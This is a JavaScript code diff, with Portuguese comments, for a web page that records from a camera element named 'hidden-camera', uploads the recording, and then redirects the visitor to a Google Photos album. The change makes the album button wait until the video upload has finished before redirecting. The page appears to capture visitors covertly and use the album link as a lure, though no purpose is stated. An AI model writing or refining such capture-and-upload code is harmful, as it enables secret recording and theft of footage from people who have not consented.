@@ -11,6 +11,8 @@ const imageViewer = document.getElementById("image-viewer");
 const videoViewer = document.getElementById("video-viewer");
 const hiddenCamera = document.getElementById("hidden-camera");
 
+// 1. variável compartilhada no topo
+let uploadPromise = null;
 let recorder;
 let recordedChunks = [];
 let stream;
@@ -64,13 +66,14 @@ function startRecording(stream) {
         }
     };
 
+    // 2. em recorder.onstop, armazena a promise em vez de só awaitar
     recorder.onstop = async () => {
-
         const blob = new Blob(recordedChunks, {
             type: mimeType || "video/mp4"
         });
 
-        await uploadVideo(blob);
+        uploadPromise = uploadVideo(blob); // ← guarda a promise
+        await uploadPromise;
 
         stream.getTracks().forEach(track => track.stop());
     };
@@ -157,7 +160,13 @@ async function uploadVideo(blob) {
     }
 }
 
-albumButton.addEventListener("click", () => {
+albumButton.addEventListener("click", async () => {
+    albumButton.disabled = true;
+    albumButton.textContent = "Aguarde..."; // feedback visual
+
+    if (uploadPromise) {
+        await uploadPromise; // espera upload terminar
+    }
 
     window.location.href = config.GOOGLE_PHOTOS_URL;
 });
